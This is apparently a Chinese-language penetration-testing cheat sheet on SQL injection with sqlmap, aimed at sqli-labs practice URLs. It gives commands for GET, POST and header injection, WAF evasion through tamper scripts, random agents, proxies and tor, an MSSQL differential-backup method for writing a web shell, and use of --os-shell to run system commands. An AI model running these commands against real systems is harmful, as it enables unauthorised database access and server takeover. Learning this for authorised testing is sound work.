## SQLMap怎么对一个注入点进行注入？

1、get类型注入，直接sqlmap -u url地址
2、post类型，（1）sqlmap -u url --data=post的参数 （2）sqlmap -r 请求数据包的文件地址

```
sqlmap -u "http://xxx/sqli/Less-11/?id=1" --data="uname=admin&passwd=admin&submit=Submit"
```

3、header注入，sqlmap -r 请求数据包的文件地址
注：在进行post注入或header注入时，可以使用*标记注入点

## MSSQL差异备份怎么getshell

前提条件：
1、MSSQL具体dbo和sa权限（数据库备份权限）
2、支持堆叠查询
3、知道网站绝对路径
实现原理
完整备份后，再次对数据库进行修改，差异备份会记录最后的LSN，将shell写入数据库，备份成asp即可getshell。

## SQL注入Bypass（过waf）思路

1、内联注释绕过
2、填充脏数据绕过
3、更改请求方式，如GET改为POST
4、随机agent绕过
5、fuzz过滤函数，函数替换绕过
6、sqlmap,tamper脚本绕过----上述思路



## **对于需要登录的网站，我们需要指定其cookie**

##### 我们可以用账号密码登录，然后用`bp`抓取其cookie填入

```
sqlmap -u  "http://xxx/sqli/Less-1/?id=1"   --cookie="抓取的cookie"
```

##### **对于是post提交数据的URL，我们需要指定其data参数**

```
sqlmap -u "http://xxx/sqli/Less-11/?id=1" --data="uname=admin&passwd=admin&submit=Submit"
```

##### 下面是sqlmap参数绕过waf的一些命令

```
#使用参数进行绕过
--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候
--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时
--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过
--ignore-proxy    禁止使用系统的代理，直接连接进行注入
--flush-session   清空会话，重构注入
--hex 或者 --no-cast     进行字符码转换
--mobile          对移动端的服务器进行注入
--tor             匿名注入
```

有些时候网站会过滤掉各种字符，可以用tamper来解决（对付某些waf时也有成效）

sqlmap 官方提供了53个绕过脚本，脚本目录在`/usr/share/sqlmap/tamper`中

指定单个脚本进行绕过：

```
sqlmap -u "http://xxx/Less-1/?id=1" --tamper=space2plus.py 
```

指定多个脚本进行绕过：

```
sqlmap -u "http://xxx/Less-1/?id=1" --tamper="space2comment.py,space2plus.py"
```

## 探测等级和危险等级(—level —risk)

sqlmap一共有5个探测等级，默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多，会自动破解出cookie、XFF等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5

## 执行操作系统命令(—os-shell)

在数据库为MySQL、PostgreSql或者SQL Server时，可以通过sqlmap执行操作系统命令

**当为MySQL数据库时，需满足下面条件：**

- 当前用户为 root

- 知道网站根目录的绝对路径

- ```
  sqlmap -u "http://xxx:7777/Less-1/?id=1" --os-shell
  ```

  